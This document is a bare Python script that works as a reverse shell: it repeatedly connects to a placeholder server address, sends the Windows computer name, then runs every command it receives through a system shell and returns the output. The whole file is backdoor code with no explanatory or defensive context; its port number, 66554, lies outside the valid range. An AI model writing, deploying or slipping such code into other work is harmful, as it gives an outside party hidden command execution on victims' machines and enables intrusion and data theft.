import socket,time,subprocess,timeout_decorator
IP = 'input server ip addr'
def command_execute(command):
    try:
        result = subprocess.check_output(command, shell=True)
        print(result.decode('shift-jis'))
        return result
    except:
        return b'error=1'
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP, 66554))
            data = subprocess.check_output('echo %computername%', shell=True)
            s.sendall(data)
            while True:
                data = s.recv(1024)
                try:
                    result = command_execute(data.decode('utf-8'))
                    if not result:
                        s.sendall(b'executed')
                    s.sendall(result)
                except:
                    s.sendall(b'error=0')
    except ConnectionRefusedError:
        continue
            
  

